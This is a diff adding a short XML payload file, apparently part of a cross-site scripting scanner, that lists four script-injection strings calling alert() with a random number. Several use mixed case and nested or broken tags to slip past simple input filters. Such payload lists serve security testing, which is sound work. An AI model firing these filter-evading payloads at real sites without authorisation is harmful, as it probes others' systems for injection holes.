@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<payload>
+    <xss_payload>
+        <!-- This is base payload module using for inject payload <script>
+        __RANDOM_INT__ has been use when run this module-->
+        <xss_string><![CDATA[<SCrIpT>alert(__RANDOM_INT__)</ScRiPt>]]></xss_string>
+        <xss_string><![CDATA[</TITLE><SCRIPT>alert(__RANDOM_INT__);</SCRIPT>]]></xss_string>
+        <xss_string><![CDATA[<ScR<script>iPt>alert(__RANDOM_INT__)</SCr<script>IpT>]]></xss_string>
+        <xss_string><![CDATA[<<SCRIPT>alert(__RANDOM_INT__);//<</SCRIPT>]]></xss_string>
+
+    </xss_payload>
+</payload>
